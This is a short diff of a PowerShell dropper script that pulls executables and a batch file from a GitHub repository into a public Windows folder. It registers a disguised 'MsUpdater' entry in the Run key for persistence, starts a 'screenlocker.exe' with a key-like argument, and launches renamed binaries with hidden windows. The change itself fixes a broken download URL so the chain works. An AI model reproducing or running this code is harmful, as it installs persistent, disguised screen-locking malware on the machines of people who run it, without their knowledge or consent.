@@ -4,7 +4,7 @@ Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/scre
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/0fxdb/instructions/main/srcs/msupdater.bat" -OutFile "C:\\Users\\Public\\Documents\\msupdater.bat";
 Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "MsUpdater" -Value "C:\\Users\\Public\\Documents\\msupdater.bat";
 Start-Process C:\\Users\\Public\\Documents\\screenlocker.exe -ArgumentList "7adba1904b0050f06bcfbd9d235065f6";
-Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/monitor_of_monitor.exee" -OutFile "C:\\Users\\Public\\Documents\\winexec.exe ";
+Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/monitor_of_monitor.exe" -OutFile "C:\\Users\\Public\\Documents\\winexec.exe ";
 Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/monitor.exe" -OutFile "C:\\Users\\Public\\Documents\\msexec.exe ";
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/0fxdb/instructions/main/srcs/runner.exe" -OutFile "C:\\Users\\Public\\Documents\\runner.exe";
 Start-Process C:\\Users\\Public\\Documents\\winexec.exe -WindowStyle Hidden;
